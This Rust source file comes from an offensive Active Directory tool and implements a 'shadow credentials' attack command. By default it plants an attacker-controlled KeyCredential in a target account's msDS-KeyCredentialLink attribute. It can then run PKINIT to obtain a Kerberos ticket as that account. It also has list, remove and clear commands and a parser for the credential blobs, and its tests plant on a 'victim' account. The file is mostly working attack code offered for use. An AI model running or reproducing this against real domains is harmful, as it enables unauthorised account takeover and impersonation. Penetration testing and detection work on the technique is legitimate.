//! Shadow Credentials — `--list` / `--remove <DeviceId>` / `--clear`
//! management on top of the existing ADD flow (which is `attack abuse
//! --action add-keycred`, optionally followed by `--action pkinit`).

use adhammer_collector::{Collector, LdapConfig};
use anyhow::{Context, Result};
use clap::Parser;

use crate::attacks::abuse::{abuse, AbuseAction, AbuseArgs};

#[derive(Parser)]
pub(crate) struct ShadowcredArgs {
    #[arg(long)]
    pub url: String,
    #[arg(long)]
    pub user: String,
    #[arg(long)]
    pub password: String,
    #[arg(long)]
    pub insecure: bool,
    /// sAMAccountName to plant the KeyCredential on.
    #[arg(long)]
    pub target: String,
    /// If set, also perform PKINIT with the fresh key and print the ccache path.
    #[arg(long)]
    pub pkinit: bool,
    /// KDC `host[:port]` (required with --pkinit).
    #[arg(long)]
    pub kdc: Option<String>,
    #[arg(long)]
    pub realm: Option<String>,
    /// List shadow credentials currently on the target (msDS-KeyCredentialLink).
    #[arg(long, conflicts_with_all = ["remove", "clear"])]
    pub list: bool,
    /// Remove a specific credential by DeviceId GUID.
    #[arg(long, value_name = "GUID", conflicts_with_all = ["list", "clear"])]
    pub remove: Option<String>,
    /// Wipe ALL shadow credentials from the target. Requires --yes.
    #[arg(long, conflicts_with_all = ["list", "remove"])]
    pub clear: bool,
    /// Confirm bulk destructive actions (--clear) non-interactively.
    #[arg(long)]
    pub yes: bool,
    /// Password for the PFX bundle emitted alongside the .key.pem on ADD (default: "adhammer").
    #[arg(long, default_value = "adhammer")]
    pub pfx_password: String,
    /// Print what --remove / --clear would send without actually writing.
    #[arg(long)]
    pub dry_run: bool,
}

/// `attack shadowcred` — thin wrapper for the ADD flow, plus management
/// (`--list` / `--remove <GUID>` / `--clear`) that reads and rewrites
/// `msDS-KeyCredentialLink` directly (no `attack abuse` roundtrip).
pub(crate) async fn shadowcred(a: ShadowcredArgs) -> Result<()> {
    if a.list {
        return list(&a).await;
    }
    if let Some(ref guid) = a.remove {
        return remove(&a, guid).await;
    }
    if a.clear {
        return clear(&a).await;
    }
    // Default: existing ADD flow (Phase 1) + optional Phase 2 (PKINIT).
    // Phase 1: plant the KeyCredential.
    abuse(AbuseArgs {
        auth: crate::shared_args::OptAuth {
            url: Some(a.url.clone()),
            user: Some(a.user.clone()),
            password: Some(a.password.clone()),
            insecure: a.insecure,
        },
        action: AbuseAction::AddKeycred,
        target: a.target.clone(),
        value: String::new(),
        kdc: a.kdc.clone(),
        realm: a.realm.clone(),
        ldap389: false,
        host: None,
        dry_run: false,
    })
    .await?;
    // .pfx alongside .key.pem for cert-tool interop. PKCS#12 has non-trivial
    // dep + LOC cost (self-signed cert + PBE + MAC); skip with a hint until
    // the p12 crate lands. Password param preserved for future use.
    let _ = &a.pfx_password;
    println!("[i] .pfx export skipped — needs the p12 crate; see docs/pfx-export.md");
    if a.pkinit {
        let (kdc, realm) = match (a.kdc.as_ref(), a.realm.as_ref()) {
            (Some(k), Some(r)) => (k.clone(), r.clone()),
            _ => anyhow::bail!("--pkinit needs both --kdc and --realm"),
        };
        // Phase 2: PKINIT with the freshly-planted key to obtain a TGT as the target.
        abuse(AbuseArgs {
            auth: crate::shared_args::OptAuth {
                url: Some(a.url),
                user: Some(a.user),
                password: Some(a.password),
                insecure: a.insecure,
            },
            action: AbuseAction::Pkinit,
            target: a.target,
            value: String::new(),
            kdc: Some(kdc),
            realm: Some(realm),
            ldap389: false,
            host: None,
            dry_run: false,
        })
        .await?;
    }
    Ok(())
}

async fn connect(a: &ShadowcredArgs) -> Result<Collector> {
    let cfg = LdapConfig {
        url: a.url.clone(),
        bind_dn: a.user.clone(),
        password: a.password.clone(),
        base_dn: None,
        insecure: a.insecure,
        gssapi: false,
    };
    Collector::connect(&cfg).await
}

async fn list(a: &ShadowcredArgs) -> Result<()> {
    let mut c = connect(a).await?;
    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;
    let values = c
        .read_multi_text(&target_dn, "msDS-KeyCredentialLink")
        .await?;
    if values.is_empty() {
        println!("no shadow credentials on {}", a.target);
        return Ok(());
    }
    println!("DeviceId                               Created (UTC)             Usage    Source");
    for v in &values {
        match parse_dn_binary(v).and_then(|b| parse_key_credential_blob(&b)) {
            Some(k) => println!(
                "{:<38} {:<25} {:<8} {}",
                format_guid(&k.device_id),
                format_filetime(k.creation_time),
                key_usage_name(k.key_usage),
                key_source_name(k.key_source),
            ),
            None => println!("<unparsed KEYCREDENTIALLINK entry, {} chars>", v.len()),
        }
    }
    Ok(())
}

async fn remove(a: &ShadowcredArgs, guid: &str) -> Result<()> {
    let wanted = parse_guid(guid).context(
        "--remove wants a GUID: `{9c8d...}` or `9c8d...` (32 hex chars, dashes optional)",
    )?;
    let mut c = connect(a).await?;
    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;
    let values = c
        .read_multi_text(&target_dn, "msDS-KeyCredentialLink")
        .await?;
    let before = values.len();
    let kept: Vec<String> = values
        .into_iter()
        .filter(|v| {
            match parse_dn_binary(v).and_then(|b| parse_key_credential_blob(&b)) {
                Some(k) => k.device_id != wanted,
                None => true, // preserve unparseable entries — no accidental data loss
            }
        })
        .collect();
    let after = kept.len();
    if after == before {
        anyhow::bail!(
            "no shadow credential with DeviceId {} on {} — nothing removed",
            format_guid(&wanted),
            a.target
        );
    }
    if a.dry_run {
        println!(
            "[dry-run] would replace msDS-KeyCredentialLink on {} — {} entries → {}",
            target_dn, before, after
        );
        println!("[dry-run] no change made");
        return Ok(());
    }
    c.replace_multi_text(&target_dn, "msDS-KeyCredentialLink", &kept)
        .await?;
    println!(
        "[+] removed KeyCredential {} from {} ({} → {} entries)",
        format_guid(&wanted),
        a.target,
        before,
        after
    );
    Ok(())
}

async fn clear(a: &ShadowcredArgs) -> Result<()> {
    if !a.yes && !confirm_clear(&a.target)? {
        anyhow::bail!("--clear aborted (no --yes and no interactive confirmation)");
    }
    let mut c = connect(a).await?;
    let target_dn = crate::target::to_dn(&mut c, &a.target).await?;
    let before = c
        .read_multi_text(&target_dn, "msDS-KeyCredentialLink")
        .await?
        .len();
    if a.dry_run {
        println!(
            "[dry-run] would clear msDS-KeyCredentialLink on {} — {} entries → 0",
            target_dn, before
        );
        println!("[dry-run] no change made");
        return Ok(());
    }
    c.replace_multi_text(&target_dn, "msDS-KeyCredentialLink", &[])
        .await?;
    println!(
        "[+] cleared msDS-KeyCredentialLink on {} ({} entries removed)",
        a.target, before
    );
    Ok(())
}

fn confirm_clear(target: &str) -> Result<bool> {
    use std::io::{stdin, stdout, Write};
    print!("Wipe ALL shadow credentials on {target}? [y/N] ");
    stdout().flush().ok();
    let mut buf = String::new();
    stdin().read_line(&mut buf)?;
    Ok(matches!(buf.trim(), "y" | "Y" | "yes" | "YES"))
}

// ─────────────────────── KEYCREDENTIALLINK parsing ───────────────────────

struct KeyCred {
    device_id: [u8; 16],
    creation_time: u64, // FILETIME (100-ns since 1601-01-01 UTC)
    key_usage: u8,
    key_source: u8,
}

/// DN-Binary syntax: `B:<hex-char-count>:<hex>:<DN>`. Returns the decoded blob.
fn parse_dn_binary(s: &str) -> Option<Vec<u8>> {
    let mut parts = s.splitn(4, ':');
    if parts.next()? != "B" {
        return None;
    }
    let _count: usize = parts.next()?.parse().ok()?;
    let hex_str = parts.next()?;
    hex::decode(hex_str).ok()
}

/// Walk a KEYCREDENTIALLINK_BLOB (version + repeating `len(u16) id(u8) value`).
/// Ignores unknown entry ids so a schema addition doesn't break `--list`.
fn parse_key_credential_blob(blob: &[u8]) -> Option<KeyCred> {
    if blob.len() < 4 {
        return None;
    }
    let mut off = 4; // skip version
    let (mut device_id, mut creation, mut key_usage, mut key_source) = (None, 0u64, 0u8, 0u8);
    while off + 3 <= blob.len() {
        let len = u16::from_le_bytes([blob[off], blob[off + 1]]) as usize;
        let id = blob[off + 2];
        off += 3;
        if off + len > blob.len() {
            return None;
        }
        let val = &blob[off..off + len];
        match id {
            0x04 if len >= 1 => key_usage = val[0],
            0x05 if len >= 1 => key_source = val[0],
            0x06 if len == 16 => {
                let mut arr = [0u8; 16];
                arr.copy_from_slice(val);
                device_id = Some(arr);
            }
            0x09 if len == 8 => {
                creation = u64::from_le_bytes([
                    val[0], val[1], val[2], val[3], val[4], val[5], val[6], val[7],
                ]);
            }
            _ => {}
        }
        off += len;
    }
    Some(KeyCred {
        device_id: device_id?,
        creation_time: creation,
        key_usage,
        key_source,
    })
}

fn key_usage_name(u: u8) -> &'static str {
    match u {
        0x00 => "AdminKey",
        0x01 => "NGC",
        0x02 => "FIDO",
        0x03 => "FEK",
        _ => "?",
    }
}

fn key_source_name(s: u8) -> &'static str {
    match s {
        0x00 => "AD",
        0x01 => "AzureAD",
        _ => "?",
    }
}

/// Windows GUID mixed-endian display: first 3 groups little-endian, last 2 as-is.
fn format_guid(b: &[u8; 16]) -> String {
    format!(
        "{:02x}{:02x}{:02x}{:02x}-{:02x}{:02x}-{:02x}{:02x}-\
         {:02x}{:02x}-{:02x}{:02x}{:02x}{:02x}{:02x}{:02x}",
        b[3],
        b[2],
        b[1],
        b[0],
        b[5],
        b[4],
        b[7],
        b[6],
        b[8],
        b[9],
        b[10],
        b[11],
        b[12],
        b[13],
        b[14],
        b[15]
    )
}

/// Accepts `{9c8d...}` or `9c8d...`; hyphens optional. 32 hex chars total.
fn parse_guid(s: &str) -> Option<[u8; 16]> {
    let s = s.trim().trim_matches(|c| c == '{' || c == '}');
    let clean: String = s.chars().filter(|c| *c != '-').collect();
    if clean.len() != 32 {
        return None;
    }
    let raw: Vec<u8> = (0..16)
        .map(|i| u8::from_str_radix(&clean[i * 2..i * 2 + 2], 16).ok())
        .collect::<Option<Vec<_>>>()?;
    let mut out = [0u8; 16];
    // Reverse first 3 groups (Data1 u32, Data2 u16, Data3 u16 — stored LE).
    out[0] = raw[3];
    out[1] = raw[2];
    out[2] = raw[1];
    out[3] = raw[0];
    out[4] = raw[5];
    out[5] = raw[4];
    out[6] = raw[7];
    out[7] = raw[6];
    out[8..].copy_from_slice(&raw[8..]);
    Some(out)
}

/// Windows FILETIME → `YYYY-MM-DD HH:MM:SS` UTC. Returns `?` when zero/invalid.
fn format_filetime(ft: u64) -> String {
    if ft == 0 {
        return "?".into();
    }
    // 100-ns since 1601 → seconds since 1970 (with underflow protection).
    let secs_since_1601 = ft / 10_000_000;
    let Some(unix) = secs_since_1601.checked_sub(11_644_473_600) else {
        return "?".into();
    };
    let unix = unix as i64;
    let (y, m, d) = civil_from_days(unix.div_euclid(86_400));
    let tod = unix.rem_euclid(86_400);
    format!(
        "{:04}-{:02}-{:02} {:02}:{:02}:{:02}",
        y,
        m,
        d,
        tod / 3600,
        (tod % 3600) / 60,
        tod % 60
    )
}

/// days since 1970-01-01 → (year, month, day). Howard Hinnant's civil_from_days.
fn civil_from_days(z: i64) -> (u16, u8, u8) {
    let z = z + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = z - era * 146_097;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = doy - (153 * mp + 2) / 5 + 1;
    let m = if mp < 10 { mp + 3 } else { mp - 9 };
    ((y + i64::from(m <= 2)) as u16, m as u8, d as u8)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn guid_round_trip() {
        let g = parse_guid("{9c8d7e6f-5a4b-3c2d-1e0f-abcdef012345}").unwrap();
        assert_eq!(format_guid(&g), "9c8d7e6f-5a4b-3c2d-1e0f-abcdef012345");
        // unbraced + uppercase also accepted
        let g2 = parse_guid("9C8D7E6F-5A4B-3C2D-1E0F-ABCDEF012345").unwrap();
        assert_eq!(g, g2);
        // hyphens optional
        let g3 = parse_guid("9c8d7e6f5a4b3c2d1e0fabcdef012345").unwrap();
        assert_eq!(g, g3);
    }

    #[test]
    fn guid_rejects_wrong_length() {
        assert!(parse_guid("beef").is_none());
        assert!(parse_guid("zzzz-zzzz-zzzz-zzzz-zzzzzzzzzzzz").is_none());
    }

    #[test]
    fn filetime_1970_epoch_boundary() {
        // 11_644_473_600 seconds between 1601-01-01 and 1970-01-01, ×10^7.
        let ft = 11_644_473_600u64 * 10_000_000;
        assert_eq!(format_filetime(ft), "1970-01-01 00:00:00");
    }

    #[test]
    fn filetime_zero_prints_placeholder() {
        assert_eq!(format_filetime(0), "?");
    }

    #[test]
    fn parses_our_own_key_credential_blob() {
        let kc = adhammer_kerberos::shadowcred::build_key_credential("CN=victim,DC=corp,DC=local")
            .unwrap();
        let blob = parse_dn_binary(&kc.dn_binary).expect("dn-binary decode");
        let parsed = parse_key_credential_blob(&blob).expect("blob parse");
        assert_eq!(parsed.key_usage, 0x01, "we plant NGC");
        assert_eq!(parsed.key_source, 0x00, "we plant KeySource=AD");
        assert_ne!(parsed.device_id, [0u8; 16], "device_id is random 16 bytes");
        assert!(parsed.creation_time > 0);
    }
}
